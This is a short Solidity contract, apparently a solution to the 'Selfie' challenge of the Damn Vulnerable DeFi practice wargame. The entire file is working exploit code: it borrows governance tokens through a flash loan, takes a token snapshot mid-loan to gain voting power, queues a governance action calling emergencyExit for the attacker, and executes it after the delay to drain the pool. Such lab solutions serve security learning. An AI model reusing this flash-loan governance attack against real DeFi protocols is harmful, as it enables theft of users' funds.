// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract FlashBorrowerAttack is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;

    uint256 actionId;

    constructor(address _governance, address _pool) {
        selfiePool = SelfiePool(_pool);
        simpleGovernance = SimpleGovernance(_governance);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        uint256 _amount = 1500000 * 1e18;

        ERC20Snapshot(selfiePool.token()).approve(address(selfiePool), _amount);

        bytes memory _data = abi.encodeWithSignature(
            "emergencyExit(address)",
            msg.sender
        );

        selfiePool.flashLoan(this, address(selfiePool.token()), _amount, _data);

        actionId = simpleGovernance.queueAction(address(selfiePool), 0, _data);
    }

    function attack_DELAY() external {
        simpleGovernance.executeAction(actionId);
    }
}
